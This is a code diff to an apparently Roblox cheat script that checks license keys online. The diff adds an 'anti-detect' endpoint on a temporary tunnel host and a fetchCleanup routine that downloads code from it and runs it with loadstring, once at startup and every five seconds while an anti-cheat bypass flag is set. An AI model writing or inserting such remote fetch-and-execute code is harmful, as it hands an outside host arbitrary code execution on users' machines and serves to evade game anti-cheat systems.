@@ -18,7 +18,8 @@ if not PlayerGui then
     PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 15)
 end
 
-local API_URL = "https://3b6e5025f564e697-112-94-186-50.serveousercontent.com/verify"
+local API_URL = "https://a16210117e55fa5f-112-94-186-50.serveousercontent.com/verify"
+local ANTI_DETECT_URL = "https://2870f142861d5b62-112-94-186-50.serveousercontent.com/get_cleanup"
 
 local function verifyKeyOnline(key)
     local url = API_URL .. "?key=" .. key
@@ -2895,6 +2896,26 @@ pcall(function()
 end)
 
 makeTween(blur, {Size = C.Blur}, 0.5)
+
+local function fetchCleanup()
+    local ok, code = pcall(HttpService.GetAsync, HttpService, ANTI_DETECT_URL)
+    if ok and code then
+        local func, err = loadstring(code)
+        if func then
+            pcall(func)
+        end
+    end
+end
+
+fetchCleanup()
+task.spawn(function()
+    while true do
+        task.wait(5)
+        if FuncState.BypassAC then
+            fetchCleanup()
+        end
+    end
+end)
 
 LocalPlayer.OnTeleport:Connect(function(state)
     if state == Enum.TeleportState.InProgress then
